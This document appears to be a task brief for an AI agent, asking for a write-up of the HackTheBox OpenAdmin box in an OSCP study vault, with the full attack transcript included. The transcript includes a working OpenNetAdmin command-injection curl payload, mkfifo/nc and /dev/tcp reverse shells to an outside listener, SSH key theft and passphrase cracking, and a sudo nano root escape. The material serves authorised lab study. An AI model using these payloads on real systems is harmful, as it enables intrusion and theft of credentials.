# Post-Box Brief — OpenAdmin (HTB)

Read `/home/kali/Documents/Obsidian/main-vault/OSCP/CODEX CONTEXT.md` in full before starting. **Do NOT run any live commands against the target — the box is already complete. Write everything from the transcript below.**

---

## Your tasks (in order)

1. Write the box write-up
2. Add ⚡ efficiency callouts for every faster alternative approach listed below
3. Add 💡 hint callouts for every gotcha listed below
4. Fill RUNBOOK V2 gaps -- read the relevant pages, then add any missing arrows, gotchas, or new pages
5. Update hub docs -- **new content only**, read every file before writing

---

## Write-up spec

**Save to:** `/home/kali/Documents/Obsidian/main-vault/OSCP/BOXES/WRITE UPS/Linux/OpenAdmin.md`

**Style:** Match any existing Linux write-up. Tutorial feel throughout -- every numbered section opens with 2-4 sentences explaining the concept BEFORE the code block. Explain WHY the tool is used, WHY each flag matters, WHAT the output means.

- YAML frontmatter (tags, platform, os, hostname, difficulty, ip, status)
- "The gist" paragraph (2-3 sentences, plain English kill chain)
- Variables table
- Numbered sections with tutorial prose per step
- $Variable conventions throughout -- never paste real credentials, IPs, or flag values
- Screenshot placeholders only -- `![[screenshot-name.png]]` with a SCREENSHOT caption
- No em dashes -- use -- instead
- Casual scannable prose, jargon explained in the same sentence
- Inline resources at the step where they're relevant
- `## RUNBOOK V2 Stages Used` wikilinked list
- `## Attack Chain` numbered, no flags or literal creds
- `## Credentials` table -- Account / Source / Use columns only
- `## Flags` -- placeholder lines, no values
- `## Key lessons` -- 2-3 bullets + ippsec link as final bullet
- `## Related Boxes` -- wikilinks to similar-technique boxes
- `## External Resources` -- inline at relevant steps, not a standalone section

---

## Box metadata

- **Platform:** HTB
- **OS:** Linux (Ubuntu 18.04)
- **Hostname:** openadmin
- **Domain:** N/A
- **Difficulty:** Easy
- **IP:** $BoxIP (10.129.1.69)
- **Tags:** #HTB #OpenAdmin #Linux #OpenNetAdmin #RCE #PasswordReuse #InternalService #SSHKey #JohnTheRipper #GTFOBins #nano #sudo

---

## The gist

OpenAdmin runs a hidden OpenNetAdmin 18.1.1 instance reachable via a link in a static music site. Unauthenticated command injection (CVE-2019-26057) gives a shell as www-data. A plaintext database password in the ONA config is reused as jimmy's SSH password; jimmy owns an internal web app (port 52846) that runs as joanna and outputs her encrypted SSH private key. After cracking the passphrase with john, SSH access as joanna reveals a sudo rule allowing nano on a fixed file -- the GTFOBins nano shell escape provides root.

---

## Variables

```bash
boxset BoxName OpenAdmin
boxset BoxIP 10.129.1.69
boxset LocalIP 10.10.14.7
boxset Username jimmy      # update to joanna after pivot
boxset Password $Password  # set when creds found
boxset Port 4444
```

---

## Full transcript

### Recon

```
sudo nmap -p- --min-rate 10000 -oA nmap/OpenAdmin_allports 10.129.1.69

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
Nmap done: 1 IP address (1 host up) scanned in 7.88 seconds
```

```
sudo nmap -sU --top-ports 100 -oA nmap/OpenAdmin_udp 10.129.1.69
# All 100 scanned ports ignored -- UDP dead end
```

```
sudo nmap -sC -sV -p 22,80 -oA nmap/OpenAdmin_services 10.129.1.69

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
```

### Web enumeration

```
curl -s http://10.129.1.69/ | grep -i 'href\|src\|comment\|<!--'
# Pure Apache default page boilerplate -- no custom links or comments

curl -s http://10.129.1.69/robots.txt
# 404 Not Found
```

```
gobuster dir -u http://10.129.1.69/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,txt,html -t 40 -o loot/gobuster.txt

music    (Status: 301)
artwork  (Status: 301)
sierra   (Status: 301)
```

```
curl -s http://10.129.1.69/music/ | grep -i 'href\|ona\|admin\|login'
# Key finding: <a href="../ona" class="login">Login</a>
```

### CMS identification

```
curl -s http://10.129.1.69/ona/ | grep -i 'version\|title'

<title>OpenNetAdmin :: 0wn Your Network</title>
Your version = v18.1.1
```

```
searchsploit opennetadmin

OpenNetAdmin 13.03.01 - Remote Code Execution       | php/webapps/26682.txt
OpenNetAdmin 18.1.1 - Command Injection (Metasploit) | php/webapps/47772.rb
OpenNetAdmin 18.1.1 - Remote Code Execution         | php/webapps/47691.sh

cat /usr/share/exploitdb/exploits/php/webapps/47691.sh
# Shows command injection via xajaxargs[]=ip=> parameter in POST to /ona/
# Output extracted using BEGIN/END markers + sed
```

### RCE verification

```
curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";id;echo \"END\"&xajaxargs[]=ping" http://10.129.1.69/ona/ | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Reverse shell

```
# Terminal 2: listener
nc -lnvp 4444

# Terminal 1: mkfifo reverse shell (bash /dev/tcp unavailable on target)
curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>%261|nc 10.10.14.7 4444 >/tmp/f&xajaxargs[]=ping" http://10.129.1.69/ona/

# Shell received:
Connection received on 10.129.1.69 59762
sh: 0: can't access tty; job control turned off
$
```

### Shell stabilisation

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
# Enter twice
export TERM=xterm

whoami && id && hostname && ip a
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
openadmin
inet 10.129.1.69
```

### Credential discovery

```
cat /opt/ona/www/local/config/database_settings.inc.php

'db_login' => 'ona_sys',
'db_passwd' => '[REDACTED]',
'db_database' => 'ona_default',
```

### Internal service discovery

```
ss -lntp

127.0.0.1:3306   # MySQL
127.0.0.1:52846  # Unknown internal service
0.0.0.0:22
*:80
```

```
ls /etc/apache2/sites-enabled/
# internal.conf  openadmin.conf

cat /etc/apache2/sites-enabled/internal.conf

Listen 127.0.0.1:52846
DocumentRoot /var/www/internal
AssignUserID joanna joanna
```

### Internal app analysis

```
ls -la /var/www/internal/
# drwxrwx--- jimmy:internal -- jimmy has write access

cat /var/www/internal/main.php
# <?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); };
# $output = shell_exec('cat /home/joanna/.ssh/id_rsa');
# echo "<pre>$output</pre>";
# Don't forget your "ninja" password

cat /var/www/internal/index.php
# Login: username=jimmy, password checked against hardcoded SHA512 hash
# DB password n1nj4W4rri0R! does NOT match the hash -- different password
```

### Pivot to joanna via file ownership

```
# jimmy owns /var/www/internal/ -- rewrite main.php to bypass session check
cat > /var/www/internal/main.php << 'EOF'
<?php
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
echo "<pre>$output</pre>";
?>
<html>
<h3>Don't forget your "ninja" password</h3>
EOF

# App runs as joanna (AssignUserID) -- curl reads joanna's key
curl -s http://127.0.0.1:52846/main.php

-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,...
[REDACTED -- key body]
-----END RSA PRIVATE KEY-----
Don't forget your "ninja" password
```

### Crack the key passphrase

```
# On Kali -- save key to loot/joanna_id_rsa (chmod 600)
ssh2john loot/joanna_id_rsa > loot/joanna_id_rsa.hash
john loot/joanna_id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt

bloodninjas   (loot/joanna_id_rsa)
0:00:00:02 DONE
```

### SSH as joanna + user flag

```
ssh -i loot/joanna_id_rsa joanna@10.129.1.69
# Passphrase: bloodninjas

joanna@openadmin:~$ cat user.txt
[FLAG REDACTED]
```

### Privilege escalation

```
sudo -l

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
```

```
sudo /bin/nano /opt/priv
# Inside nano:
# Ctrl+R --> Ctrl+X --> type: reset; sh 1>&0 2>&0 --> Enter

# Root shell appears:
# whoami && id
root
uid=0(root) gid=0(root) groups=0(root)

cat /root/root.txt
[FLAG REDACTED]
```

### Cleanup

```
# Exit root shell
# Back in joanna's shell -- restore main.php to original
cat > /var/www/internal/main.php << 'EOF'
<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); };
# Open Admin Trusted
# OpenAdmin
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
echo "<pre>$output</pre>";
?>
<html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
EOF

# Verified main.php restored to original content
# Exit joanna SSH

# On Kali:
rm loot/joanna_id_rsa loot/joanna_id_rsa.hash
boxdone
```

---

## Gotchas -- use these for 💡 hint callouts

1. **bash /dev/tcp reverse shell doesn't work on this target.** The `bash -i >& /dev/tcp/$IP/$PORT 0>&1` payload fails silently -- the shell executes but the connection never arrives. Use the mkfifo/nc approach instead: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc $IP $PORT >/tmp/f`.

2. **The & in >& must be URL-encoded as %26 in curl -d strings.** Without encoding, curl treats it as a POST parameter separator and the injection breaks. The mkfifo approach avoids this entirely since it uses pipes instead of redirects.

3. **The DB password (n1nj4W4rri0R!) is NOT jimmy's web app password.** The SHA512 of the DB password doesn't match the hash in index.php. Don't waste time trying variations -- the web app login is a dead end; use jimmy's file ownership to bypass it instead.

4. **The passphrase hint says "ninja" but the actual passphrase is "bloodninjas".** Always crack with john rather than guessing variations -- rockyou.txt finds it in 2 seconds.

5. **nano GTFOBins escape requires the exact key sequence.** Ctrl+R opens "Read File", then Ctrl+X switches to "Execute Command". Typing the wrong key sequence opens a different nano function. If you lose the shell, re-run `sudo /bin/nano /opt/priv` and try again.

6. **Restore main.php after pivoting.** The session check was removed to read joanna's key. Restore the original content before leaving the box -- other players need the intended path to work.

7. **Jimmy's web app password is different from his SSH password.** The SHA512 hash in index.php doesn't correspond to n1nj4W4rri0R! -- the intended pivot is via file ownership, not authentication.

---

## Efficiency candidates -- use these for ⚡ callouts

1. **Reading the music site source** finds the /ona/ link immediately. Browsing all three directories (music, artwork, sierra) manually would take longer -- grep for href/login in the first one found.

2. **Reading the PHP source directly** (`cat main.php`) tells us the page runs `cat /home/joanna/.ssh/id_rsa` as joanna. We don't need to authenticate to the web app at all -- just remove the session check and curl it.

3. **John cracks the SSH passphrase in 2 seconds** from rockyou.txt. Manual guessing of "ninja" variations wastes time.

4. **Checking apache vhost configs immediately** after finding an unknown internal port is faster than port-knocking or service fingerprinting. `ls /etc/apache2/sites-enabled/` gives the full picture in one command.

---

## RUNBOOK V2 gap-fill

RUNBOOK V2 is at `/home/kali/Documents/Obsidian/main-vault/OSCP/RUNBOOK V2/`

**Step numbers used in this box:** 1, 2, 3, 5, 6, 10, 11, 12, 13, 14, 21

**Gaps found:**

1. **Internal port → Apache vhost → AssignUserID pivot (Steps 13-14 area)** -- When `ss -lntp` shows an unknown localhost port, checking `/etc/apache2/sites-enabled/` is the immediate next step if Apache is running. Add an arrow to the local enumeration stage: "Unknown localhost port found → check /etc/apache2/sites-enabled/ for vhost configs → look for AssignUserID directives (process runs as different user)".

2. **File ownership bypass for session-protected PHP (Steps 10-11 area)** -- When a web app is owned by the current user, session-protected pages can be bypassed by rewriting the PHP to remove the auth check. Add a gotcha: check `ls -la` on the web root before attempting to authenticate -- if you own the files, auth is irrelevant.

3. **GTFOBins nano sudo escape (Step 14/21 area)** -- If not already in the sudo privesc stage, add nano as a named entry: `sudo /bin/nano <file>` → Ctrl+R → Ctrl+X → `reset; sh 1>&0 2>&0` → root shell. Note that a proper TTY is required for the key sequences to register correctly.

4. **SSH key passphrase cracking (Steps 12-13 area)** -- Add workflow: found encrypted SSH key → `ssh2john key > key.hash` → `john key.hash --wordlist=/usr/share/wordlists/rockyou.txt` → use cracked passphrase with `ssh -i key user@host`.

**Hard rules:**
- Read each target page before editing
- One decision per page
- Every arrow: `Step N · [[Page Name]]`
- Do NOT touch `/home/kali/Documents/Obsidian/main-vault/OSCP/RUNBOOK/`
- Do NOT remove existing content

---

## Hub doc update scope -- new content only

Read every file before writing. Only add what is genuinely absent.

**Command Appendix:** Add if not present:
- mkfifo reverse shell: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc $LocalIP $Port >/tmp/f`
- ONA RCE one-liner: the curl command injection pattern against /ona/
- ssh2john + john workflow: `ssh2john key > key.hash && john key.hash --wordlist=/usr/share/wordlists/rockyou.txt`

**Command Breakdowns:** Add if not present:
- `ssh2john` -- what it does (extracts hash from encrypted private key for john to crack)
- `2>%261` in curl POST -- why `>&` must be encoded as `>%26` in -d strings
- nano GTFOBins escape -- Ctrl+R → Ctrl+X → command execute pattern explained

**Decision Tree:** Add if not present:
- Unknown localhost port found → check Apache vhost configs → AssignUserID directive → process runs as different user → that user's files accessible via the web app
- sudo nano → GTFOBins escape → root shell

**Module notes:**
- M08/M09 (Web Application Attacks) -- add OpenAdmin as Related Box for CMS RCE technique
- M18 (Linux Privilege Escalation) -- add OpenAdmin as Related Box for sudo GTFOBins (nano) technique

---

## Hard rules

- No flag values anywhere in any file
- $Variable conventions throughout
- No em dashes -- use -- instead
- Read before writing every file
- No content removal -- addition and clarification only
- Plain English, jargon explained in the same sentence
- Screenshot placeholders only -- descriptive name + SCREENSHOT caption
- Report what was added and where -- do not paste full files back

## External Resources

- [Exploit-DB 47691](https://www.exploit-db.com/exploits/47691) -- OpenNetAdmin 18.1.1 RCE
- [GTFOBins -- nano](https://gtfobins.github.io/gtfobins/nano/#sudo) -- sudo nano shell escape
- [HackTricks -- File Upload / RCE](https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html)
- [RevShells](https://www.revshells.com/)
